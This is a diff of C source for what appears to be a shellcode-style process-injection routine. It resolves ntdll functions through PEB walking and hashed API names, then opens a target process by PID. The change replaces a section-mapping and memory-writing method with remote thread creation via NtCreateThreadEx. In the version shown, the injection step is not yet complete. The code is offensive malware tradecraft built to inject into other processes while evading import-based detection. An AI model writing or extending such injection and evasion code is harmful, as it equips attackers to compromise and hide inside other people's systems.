@@ -12,22 +12,15 @@
 
 typedef struct
 {
-	D_API( NtQueryInformationProcess );
-	D_API( NtUnmapViewOfSection );
-	D_API( NtMapViewOfSection );
+	D_API( RtlExitUserThread );
+	D_API( NtCreateThreadEx );
 	D_API( NtOpenProcess );
 	D_API( NtClose );
 } API ;
 
-typedef struct
-{
-	D_API( NtAllocateVirtualMemory );
-	D_API( NtWaitForSingleObject );
-	D_API( NtWriteVirtualMemory );
-} SYS ;
-
 /* API Hashes */
-#define H_API_NTALLOCATEVIRTUALMEMORY	0xf783b8ec /* NtAllocateVirtualMemory */
+#define H_API_RTLEXITUSERTHREAD		0x2f6db5e8 /* RtlExitUserThread */
+#define H_API_NTCREATETHREADEX		0xaf18cfb0 /* NtCreateThreadEx */
 #define H_API_NTOPENPROCESS		0x4b82f718 /* NtOpenProcess */
 #define H_API_NTCLOSE			0x40d6e69d /* NtClose */
 
@@ -45,35 +38,33 @@ typedef struct
 D_SEC( A ) DWORD __cdecl Entry( _In_ DWORD Pid, _In_ DWORD Offset, _In_ PVOID Buffer, _In_ DWORD Length )
 {
 	API			Api;
-	SYS			Sys;
 	CLIENT_ID		Cid;
 	OBJECT_ATTRIBUTES	Att;
 
-	SIZE_T			Len = 0;
-
-	PVOID			Buf = NULL;
+	HANDLE			Thd = NULL;
 	HANDLE			Prc = NULL;
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
-	RtlSecureZeroMemory( &Sys, sizeof( Sys ) );
 	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
 	RtlSecureZeroMemory( &Att, sizeof( Att ) );
 
-	Api.NtOpenProcess = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENPROCESS );
-	Api.NtClose       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );
+	Api.RtlExitUserThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEXITUSERTHREAD ); 
+	Api.NtCreateThreadEx  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATETHREADEX ); 
+	Api.NtOpenProcess     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENPROCESS );
+	Api.NtClose           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );
 
 	Cid.UniqueProcess = C_PTR( Pid );
 	InitializeObjectAttributes( &Att, NULL, 0, NULL, NULL );
 
-	/* Open up the target process for writing arbitrary memory to! */
-	if ( NT_SUCCESS( Api.NtOpenProcess( &Prc, PROCESS_ALL_ACCESS, &Att, &Cid ) ) ) {
+	/* Open up the target process to create threads within. */
+	if ( NT_SUCCESS( Api.NtOpenProcess( &Prc, PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE, &Att, &Cid ) ) ) {
+		/* Close Reference! */
 		Api.NtClose( Prc );
 	};
 
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
-	RtlSecureZeroMemory( &Sys, sizeof( Sys ) );
 	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
 	RtlSecureZeroMemory( &Att, sizeof( Att ) );
 };
